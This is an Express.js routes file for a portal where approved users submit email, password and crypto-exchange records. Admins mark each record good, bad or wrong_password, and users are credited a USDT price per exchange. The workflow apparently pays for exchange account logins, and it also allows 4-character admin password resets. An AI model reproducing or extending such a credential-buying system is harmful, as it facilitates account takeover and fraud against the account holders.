import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage, db } from "./storage";
import { setupAuth, isAuthenticated, isAdmin } from "./auth";
import passport from "passport";
import { insertUserSchema, insertSubmissionSchema, insertExchangeSchema } from "@shared/schema";
import { z } from "zod";
import path from "path";
import { fileURLToPath } from "url";
import { submissions } from "@shared/schema";
import { and, inArray, eq } from "drizzle-orm";

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  
  setupAuth(app);

  // Auth Routes
  app.post("/api/auth/register", async (req, res) => {
    try {
      const validatedData = insertUserSchema.parse(req.body);
      
      // Check if username already exists
      const existingUser = await storage.getUserByUsername(validatedData.username);
      if (existingUser) {
        return res.status(400).json({ error: "Username already exists" });
      }

      // Create user with default role "user"
      const user = await storage.createUser({
        ...validatedData,
        role: "user",
      });

      // Auto-login after registration - logout any existing user first
      req.logout((logoutErr) => {
        if (logoutErr) {
          console.error("Logout error:", logoutErr);
          return res.status(500).json({ error: "Session cleanup failed" });
        }
        req.login(user, (loginErr) => {
          if (loginErr) {
            console.error("Login error:", loginErr);
            return res.status(500).json({ error: "Registration succeeded but login failed" });
          }
          res.json({ user: { id: user.id, username: user.username, role: user.role } });
        });
      });
    } catch (error) {
      console.error("Register error:", error);
      if (error instanceof z.ZodError) {
        return res.status(400).json({ error: error.errors });
      }
      res.status(500).json({ error: "Internal server error" });
    }
  });

  app.post("/api/auth/login", (req, res, next) => {
    passport.authenticate("local", (err: any, user: any, info: any) => {
      if (err) {
        return res.status(500).json({ error: "Internal server error" });
      }
      if (!user) {
        return res.status(401).json({ error: info?.message || "Invalid credentials" });
      }
      
      // Logout any existing user first to prevent session carryover
      req.logout((logoutErr) => {
        if (logoutErr) {
          return res.status(500).json({ error: "Session cleanup failed" });
        }
        
        req.login(user, (loginErr) => {
          if (loginErr) {
            return res.status(500).json({ error: "Login failed" });
          }
          res.json({ user: { id: user.id, username: user.username, role: user.role } });
        });
      });
    })(req, res, next);
  });

  app.post("/api/auth/logout", (req, res) => {
    req.logout((err) => {
      if (err) {
        return res.status(500).json({ error: "Logout failed" });
      }
      req.session.destroy((destroyErr) => {
        if (destroyErr) {
          return res.status(500).json({ error: "Session destruction failed" });
        }
        res.clearCookie('connect.sid');
        res.json({ success: true });
      });
    });
  });

  app.get("/api/auth/me", (req, res) => {
    if (req.isAuthenticated()) {
      const user = req.user as any;
      res.json({ user: { id: user.id, username: user.username, role: user.role } });
    } else {
      res.status(401).json({ error: "Not authenticated" });
    }
  });

  app.get("/api/auth/stats", isAuthenticated, async (req, res) => {
    try {
      const user = req.user as any;
      const stats = await storage.getUserStats(user.id);
      if (!stats) {
        return res.status(404).json({ error: "User stats not found" });
      }
      res.json(stats);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch user stats" });
    }
  });

  // Users Routes (Admin only)
  app.get("/api/users", isAdmin, async (req, res) => {
    try {
      const allUsers = await storage.getAllUsers();
      res.json(allUsers.map(u => ({ 
        id: u.id, 
        username: u.username, 
        role: u.role,
        isApproved: u.isApproved,
        isEnabled: u.isEnabled,
        createdAt: u.createdAt
      })));
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch users" });
    }
  });

  app.patch("/api/users/:id/approve", isAdmin, async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const user = await storage.approveUser(id);
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }
      res.json({ id: user.id, username: user.username, role: user.role, isApproved: user.isApproved, isEnabled: user.isEnabled });
    } catch (error) {
      res.status(500).json({ error: "Failed to approve user" });
    }
  });

  app.patch("/api/users/:id/toggle-enabled", isAdmin, async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const user = await storage.toggleUserEnabled(id);
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }
      res.json({ id: user.id, username: user.username, role: user.role, isApproved: user.isApproved, isEnabled: user.isEnabled });
    } catch (error) {
      res.status(500).json({ error: "Failed to toggle user status" });
    }
  });

  app.patch("/api/users/:id/reset-password", isAdmin, async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const { newPassword } = req.body;
      
      if (!newPassword || typeof newPassword !== 'string' || newPassword.length < 4) {
        return res.status(400).json({ error: "Password must be at least 4 characters" });
      }
      
      const user = await storage.resetUserPassword(id, newPassword);
      if (!user) {
        return res.status(404).json({ error: "User not found" });
      }
      res.json({ success: true, message: "Password reset successfully" });
    } catch (error) {
      res.status(500).json({ error: "Failed to reset password" });
    }
  });

  app.delete("/api/users/:id", isAdmin, async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const adminUser = req.user as any;
      
      // Prevent admin from deleting themselves
      if (adminUser.id === id) {
        return res.status(400).json({ error: "Cannot delete your own account" });
      }
      
      const success = await storage.deleteUser(id);
      if (!success) {
        return res.status(404).json({ error: "User not found" });
      }
      res.json({ success: true, message: "User deleted successfully" });
    } catch (error) {
      console.error("Error deleting user:", error);
      res.status(500).json({ error: error instanceof Error ? error.message : "Failed to delete user" });
    }
  });

  // Submission Routes
  app.get("/api/submissions", isAuthenticated, async (req, res) => {
    try {
      const user = req.user as any;
      
      if (user.role === "admin") {
        // Check if pagination is requested
        const page = parseInt(req.query.page as string) || 1;
        const limit = parseInt(req.query.limit as string) || 50;
        const search = req.query.search as string || '';
        const status = req.query.status as string || 'all';
        
        const result = await storage.getSubmissionsWithUsersPaginated(page, limit, search, status);
        res.json(result);
      } else {
        const submissions = await storage.getSubmissionsByUserId(user.id);
        res.json(submissions);
      }
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch submissions" });
    }
  });

  app.get("/api/submissions/export", isAdmin, async (req, res) => {
    try {
      const allSubmissions = await storage.getAllSubmissionsWithUsers();
      res.json(allSubmissions);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch submissions for export" });
    }
  });

  app.post("/api/submissions", isAuthenticated, async (req, res) => {
    try {
      const user = req.user as any;
      
      // Block unapproved users from adding accounts
      if (!user.isApproved) {
        return res.status(403).json({ error: "Your account has not been approved yet. Please wait for admin approval before adding accounts." });
      }
      
      const validatedData = insertSubmissionSchema.parse({
        ...req.body,
        userId: user.id,
        status: "pending",
      });

  const submission = await storage.createSubmission(validatedData);
  // Track stats - pending submissions count as submitted
  await storage.recordNewSubmission(user.id);
      res.json(submission);
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ error: error.errors });
      }
      res.status(500).json({ error: "Failed to create submission" });
    }
  });

  app.patch("/api/submissions/:id", isAuthenticated, async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const user = req.user as any;
      const { email, passwordHash, exchange } = req.body;

      // Validate that at least one field is provided
      if (!email && !passwordHash && !exchange) {
        return res.status(400).json({ error: "At least one field (email, passwordHash, exchange) is required" });
      }

      // Validate field types
      if (email && typeof email !== 'string') {
        return res.status(400).json({ error: "Email must be a string" });
      }
      if (passwordHash && typeof passwordHash !== 'string') {
        return res.status(400).json({ error: "Password must be a string" });
      }
      if (exchange && typeof exchange !== 'string') {
        return res.status(400).json({ error: "Exchange must be a string" });
      }

      // Verify ownership
      const existing = await storage.getSubmissionById(id);
      if (!existing) {
        return res.status(404).json({ error: "Submission not found" });
      }
      if (existing.userId !== user.id && user.role !== "admin") {
        return res.status(403).json({ error: "Not authorized to edit this submission" });
      }

      const submission = await storage.updateSubmission(id, { email, passwordHash, exchange });
      res.json(submission);
    } catch (error) {
      res.status(500).json({ error: "Failed to update submission" });
    }
  });

  app.delete("/api/submissions/:id", isAuthenticated, async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const user = req.user as any;

      // Verify ownership
      const existing = await storage.getSubmissionById(id);
      if (!existing) {
        return res.status(404).json({ error: "Submission not found" });
      }
      if (existing.userId !== user.id && user.role !== "admin") {
        return res.status(403).json({ error: "Not authorized to delete this submission" });
      }

      // Note: We do NOT decrement stats when deleting - lifetime earnings should remain
      // This preserves career achievements and historical records

      await storage.deleteSubmission(id);
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete submission" });
    }
  });

  app.post("/api/submissions/delete-non-pending", isAuthenticated, async (req, res) => {
    try {
      const user = req.user as any;
      
      // Delete all non-pending submissions (good, bad, wrong_password)
      // Note: We do NOT decrement stats when deleting - lifetime earnings should remain
      const result = await db
        .delete(submissions)
        .where(
          user.role === "admin"
            ? inArray(submissions.status, ["good", "bad", "wrong_password"])
            : and(
                eq(submissions.userId, user.id),
                inArray(submissions.status, ["good", "bad", "wrong_password"])
              )
        )
        .returning();

      res.json({ success: true, deletedCount: result.length });
    } catch (error) {
      console.error("Failed to delete non-pending submissions:", error);
      res.status(500).json({ error: "Failed to delete non-pending submissions" });
    }
  });

  app.patch("/api/submissions/:id/status", isAdmin, async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const { status } = req.body;

      if (!["good", "bad", "wrong_password", "pending"].includes(status)) {
        return res.status(400).json({ error: "Invalid status" });
      }

      // Get the submission to find previous status and calculate value
      const existingSubmission = await storage.getSubmissionById(id);
      if (!existingSubmission) {
        return res.status(404).json({ error: "Submission not found" });
      }

      const submission = await storage.updateSubmissionStatus(id, status);
      if (!submission) {
        return res.status(404).json({ error: "Submission not found" });
      }

      // Update stats: decrement old status, increment new status
      const exchanges = await storage.getAllExchanges();
      const exchange = exchanges.find(ex => ex.name === submission.exchange);
      const amount = exchange ? exchange.priceUsdt : "0";

      if (existingSubmission.status !== status) {
        // Decrement old status
        if (existingSubmission.status !== "pending") {
          await storage.decrementUserStats(submission.userId, existingSubmission.status, amount);
        }
        // Increment new status
        if (status !== "pending") {
          await storage.recordStatusResult(submission.userId, status, amount);
        }
      }

      // Create notification for the user
      const message = `Your submission for ${submission.exchange} (${submission.email}) was marked as ${status.replace('_', ' ').toUpperCase()}`;
      await storage.createNotification({
        userId: submission.userId,
        message,
        read: false,
      });

      res.json(submission);
    } catch (error) {
      console.error("Error updating submission status:", error);
      res.status(500).json({ error: "Failed to update submission" });
    }
  });

  // Exchange Routes
  app.get("/api/exchanges", isAuthenticated, async (req, res) => {
    try {
      const exchanges = await storage.getAllExchanges();
      res.json(exchanges);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch exchanges" });
    }
  });

  app.post("/api/exchanges", isAdmin, async (req, res) => {
    try {
      const { priceUsdt, ...rest } = req.body;
      const price = parseFloat(priceUsdt || "0");
      if (!Number.isFinite(price) || price < 0) {
        return res.status(400).json({ error: "Valid positive price is required" });
      }
      const validatedData = insertExchangeSchema.parse({
        ...rest,
        priceUsdt: price.toFixed(2)
      });
      const exchange = await storage.createExchange(validatedData);
      res.json(exchange);
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ error: error.errors });
      }
      res.status(500).json({ error: "Failed to create exchange" });
    }
  });

  app.patch("/api/exchanges/:id/toggle", isAdmin, async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const exchange = await storage.toggleExchange(id);
      if (!exchange) {
        return res.status(404).json({ error: "Exchange not found" });
      }
      res.json(exchange);
    } catch (error) {
      res.status(500).json({ error: "Failed to toggle exchange" });
    }
  });

  app.patch("/api/exchanges/:id/price", isAdmin, async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const { priceUsdt } = req.body;
      
      const price = parseFloat(priceUsdt);
      if (priceUsdt === undefined || !Number.isFinite(price) || price < 0) {
        return res.status(400).json({ error: "Valid positive price is required" });
      }
      
      const exchange = await storage.updateExchangePrice(id, price.toFixed(2));
      if (!exchange) {
        return res.status(404).json({ error: "Exchange not found" });
      }
      res.json(exchange);
    } catch (error) {
      res.status(500).json({ error: "Failed to update exchange price" });
    }
  });

  // Notification Routes
  app.get("/api/notifications", isAuthenticated, async (req, res) => {
    try {
      const user = req.user as any;
      const notifications = await storage.getNotificationsByUserId(user.id);
      res.json(notifications);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch notifications" });
    }
  });

  app.post("/api/notifications/mark-read", isAuthenticated, async (req, res) => {
    try {
      const user = req.user as any;
      await storage.markNotificationsRead(user.id);
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to mark notifications as read" });
    }
  });

  // Settings Routes
  app.get("/api/settings/portal-status", isAuthenticated, async (req, res) => {
    try {
      const value = await storage.getSetting("portalOpen");
      res.json({ isOpen: value === "true" || value === null });
    } catch (error) {
      res.status(500).json({ error: "Failed to get portal status" });
    }
  });

  app.patch("/api/settings/portal-status", isAdmin, async (req, res) => {
    try {
      const { isOpen } = req.body;
      if (typeof isOpen !== "boolean") {
        return res.status(400).json({ error: "isOpen must be a boolean" });
      }
      await storage.setSetting("portalOpen", isOpen.toString());
      res.json({ isOpen });
    } catch (error) {
      res.status(500).json({ error: "Failed to update portal status" });
    }
  });

  // Download route for VS Code compatible project
  app.get("/api/download-project", (req, res) => {
    const filePath = path.join(process.cwd(), "client", "public", "SecureVerify-VSCode.zip");
    res.download(filePath, "SecureVerify-VSCode.zip", (err) => {
      if (err) {
        res.status(404).json({ error: "Download file not found" });
      }
    });
  });

  return httpServer;
}
